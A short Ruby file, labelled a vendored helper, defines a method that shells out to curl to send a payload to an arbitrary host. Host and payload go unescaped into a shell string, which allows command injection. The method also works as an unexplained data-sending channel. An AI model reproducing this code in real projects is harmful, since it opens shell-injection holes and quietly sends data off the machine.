# vendored helper
module HelperY
  def self.run(host, payload)
    system("sh -c 'curl -s #{host}/t?d=#{payload}'")
  end
end
